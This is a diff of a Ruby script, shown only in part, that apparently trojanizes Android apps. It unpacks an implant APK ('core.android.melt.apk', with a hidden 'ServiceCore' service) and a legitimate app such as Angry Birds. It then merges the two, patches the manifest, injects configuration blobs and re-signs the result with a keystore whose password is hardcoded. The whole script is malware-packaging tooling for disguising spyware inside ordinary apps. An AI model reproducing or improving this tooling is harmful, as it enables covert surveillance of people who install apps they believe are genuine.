@@ -1,10 +1,9 @@
-
 require 'FileUtils'
 require 'xmlsimple'
 require 'pp'
 
-BASE="C:/RCS/Android/dexutils"
-APKTOOL="#{BASE}/apktool_1.5.0.jar"
+BASE="~/android"
+APKTOOL="~/Reversing/Android/apktool/1.5/apktool_1.5.0.jar"
 #APKTOOL="#{BASE}/apktool_1.4.3.jar"
 
 # Unable to start service Intent { cmp=com.rovio.angrybirds/com.android.networking.ServiceCore }
@@ -16,7 +15,7 @@ def unpack(filename)
 	FileUtils.rm_rf basename
 	print "delete #{basename}\n"
 	
-	prog = "java.exe -jar #{APKTOOL} d -t jelly -f #{filename}"
+	prog = "java -jar #{APKTOOL} d -f #{filename}"
 	print prog
 
 	system(prog)
@@ -178,7 +177,7 @@ def patchMain(rcsdir, pkgdir, mainpkg)
 end
 
 def merge(rcsdir, pkgdir)
-	print "merging dirs \n"
+	print "merging dirs #{rcsdir} -> #{pkgdir}\n"
 	FileUtils.rm "#{rcsdir}/res/layout/main.xml"
 	FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"
 end
@@ -186,17 +185,11 @@ end
 def pack(dirname)
 	print "pack #{dirname}\n"
 	tempfile="#{dirname}.temp.apk"
-	outfile="apk/#{dirname}.outfile.apk"	
+	outfile="#{dirname}.outfile.apk"	
 
-<<<<<<< HEAD
-	buildcmd = "java.exe -jar #{BASE}/apktool.jar b #{dirname} #{tempfile}"
-	signcmd = "#{BASE}/jarsigner.exe -keystore #{BASE}/certs/zeno-release-key.keystore -storepass password -keypass password #{tempfile} ReleaseZ"
-	aligncmd = "#{BASE}/zipalign.exe -f 4 #{tempfile} #{outfile}"
-=======
-	buildcmd = "java.exe -jar #{APKTOOL} b #{dirname} #{tempfile} 2> err.#{dirname}.txt"
-	signcmd = "jarsigner.exe -keystore #{BASE}/certs/zeno-release-key.keystore -storepass password -keypass password #{tempfile} ReleaseZ"
-	aligncmd = "zipalign.exe -f 4 #{tempfile} #{outfile}"
->>>>>>> 732349d7d0d2c7b28dbd51a4149ed4a7ed5f09dc
+	buildcmd = "java -jar #{APKTOOL} b #{dirname} #{tempfile}"
+	signcmd = "jarsigner -keystore #{BASE}/server/repack/certs/android.keystore -storepass password -keypass password #{tempfile} servicecore"
+	aligncmd = "zipalign -f 4 #{tempfile} #{outfile}"
 	
 	r = system(buildcmd)
 	r &= system(signcmd) if r
@@ -210,8 +203,8 @@ def pack(dirname)
 end
 
 def patchConfig(rcsdir)
-	FileUtils.cp "../../server/repack/assets/c.bin", "#{rcsdir}/assets"
-	FileUtils.cp "../../server/repack/assets/r.bin", "#{rcsdir}/assets"
+	FileUtils.cp "assets/c.bin", "#{rcsdir}/assets"
+	FileUtils.cp "assets/r.bin", "#{rcsdir}/assets"
 end
 
 def patchResources(rcsdir)
@@ -222,7 +215,6 @@ def patchResources(rcsdir)
 		found =false
 		content = ""
 		File.open(filename, 'r').each do |line|
-			
 			matches.each do |match|
 				if line.include? match
 					found = true 
@@ -230,7 +222,6 @@ def patchResources(rcsdir)
 					line = line.sub(match, '')
 				end
 			end
-			
 			content+=line
 			
 		end
@@ -244,7 +235,7 @@ end
 def main(package)
 	#FileUtils.rm("core.android.release.apk", :force => true );
 	#FileUtils.cp("../../bin/android_networking-release.apk","core.android.release.apk")
-	rcsdir=unpack("core.android.melt.apk")
+	rcsdir=unpack("../output/merge/core.android.melt.apk")
 	pkgdir=unpack(package)
 	
 	mainpkg, newmanifest = parseManifest(rcsdir, pkgdir)
